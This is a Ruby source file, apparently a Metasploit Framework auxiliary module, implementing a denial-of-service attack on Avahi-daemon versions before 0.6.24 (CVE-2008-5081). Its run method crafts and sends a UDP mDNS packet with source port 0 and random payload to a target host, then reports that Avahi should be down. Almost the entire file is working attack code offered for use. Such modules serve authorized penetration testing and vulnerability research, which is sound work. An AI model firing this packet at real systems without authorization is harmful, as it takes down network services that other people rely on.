##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Capture
  include Msf::Auxiliary::Dos

  def initialize(info={})
    super(
        update_info(
            info,
            'Name'        => 'Avahi < 0.6.24 Source Port 0 DoS',
            'Description' => %q{
              Avahi-daemon versions prior to 0.6.24 can be DoS'd
              with an mDNS packet with a source port of 0
            },
            'Author'      => 'kris katterjohn',
            'License'     => MSF_LICENSE,
            'References'  => [
                [ 'CVE', '2008-5081' ],
                [ 'OSVDB', '50929' ],
            ],
            'DisclosureDate' => 'Nov 14 2008'
        )
    )

    register_options([
      OptInt.new('RPORT', [true, 'The destination port', 5353])
    ])

    deregister_options('FILTER','PCAPFILE')
  end

  def run
    open_pcap

    print_status("Sending to #{rhost}")

    p = PacketFu::UDPPacket.new
    p.ip_saddr = "0.0.0.0"
    p.ip_daddr = rhost
    p.ip_frag = 0x4000 # Original had ip frag flags set to 2 for some reason.
    p.udp_sport = 0 # That's the bug
    p.udp_dport = datastore['RPORT'].to_i
    p.payload = Rex::Text.rand_text(rand(0x20)) # UDP needs at least one data byte, may as well send a few.
    p.recalc
    capture_sendto(p, rhost)

    close_pcap

    print_status("Avahi should be down now")
  end
end
